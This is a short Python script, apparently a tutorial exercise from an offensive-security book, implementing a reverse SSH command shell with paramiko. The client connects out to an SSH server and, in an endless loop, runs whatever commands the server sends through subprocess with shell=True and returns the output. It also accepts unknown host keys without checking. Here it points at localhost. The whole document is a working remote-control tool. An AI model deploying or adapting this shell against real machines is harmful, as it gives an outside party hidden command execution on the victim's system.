#!/usr/bin/env python
"""SSH Reverse CMD.

So with the basics done, let’s modify our script to support running commands on our Windows client
over SSH. Of course, normally when using SSH, you use an SSH client to connect to an SSH server,
but because Windows doesn’t include an SSH server out-of-the-box, we need to reverse this and send
commands from our SSH server to the SSH client.
"""
import paramiko
import subprocess
import threading
import getpass


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        while True:
            command = ssh_session.recv(1024)  # get cmd from ssh server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return


user = getpass.getuser()
passwd = getpass.getpass("password:")
ssh_command("localhost", user, passwd, "ClientConnected")
